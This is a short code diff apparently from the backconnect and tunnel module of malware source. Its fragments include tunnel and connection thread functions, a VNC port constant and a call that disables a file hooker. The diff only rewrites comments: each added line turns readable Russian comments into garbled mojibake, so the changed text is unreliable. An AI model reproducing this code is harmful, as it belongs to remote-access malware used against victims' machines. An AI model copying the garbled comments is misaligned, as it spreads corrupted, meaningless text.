@@ -21,13 +21,13 @@
 #if(BO_BCSERVER_PLATFORMS > 0)
 
 /*
-  Проверяет, ялвется список серверов валидным.
+  РџСЂРѕРІРµСЂСЏРµС‚, СЏР»РІРµС‚СЃСЏ СЃРїРёСЃРѕРє СЃРµСЂРІРµСЂРѕРІ РІР°Р»РёРґРЅС‹Рј.
 
-  IN list     - список.
-  IN listSize - размер списка.
+  IN list     - СЃРїРёСЃРѕРє.
+  IN listSize - СЂР°Р·РјРµСЂ СЃРїРёСЃРєР°.
 
-  Return      - true - список валидный,
-                false - список не валидный.
+  Return      - true - СЃРїРёСЃРѕРє РІР°Р»РёРґРЅС‹Р№,
+                false - СЃРїРёСЃРѕРє РЅРµ РІР°Р»РёРґРЅС‹Р№.
 */
 static bool isValidList(const LPSTR list, DWORD listSize)
 {
@@ -55,7 +55,7 @@ typedef struct
 #define SERVICE_PORT_VNC   ((DWORD)-2) //VNC.
 
 /*
-  Поток для для создания тунеля.
+  РџРѕС‚РѕРє РґР»СЏ РґР»СЏ СЃРѕР·РґР°РЅРёСЏ С‚СѓРЅРµР»СЏ.
 
   IN p   - BCTUNNELDATA.
 
@@ -134,7 +134,7 @@ static DWORD WINAPI procTunnel(void *p)
 }
 
 /*
-  Поток для для создания бэконекта.
+  РџРѕС‚РѕРє РґР»СЏ РґР»СЏ СЃРѕР·РґР°РЅРёСЏ Р±СЌРєРѕРЅРµРєС‚Р°.
 
   IN p   - BCDATA.
 
@@ -240,9 +240,9 @@ static DWORD WINAPI procConnection(void *p)
   return 0;
 }
 
-/*В В To create a stream for monitoring bekonektov.
+/*Р’В Р’В To create a stream for monitoring bekonektov.
 
-В В Return - 0.*/
+Р’В Р’В Return - 0.*/
 static DWORD WINAPI proc(void *)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
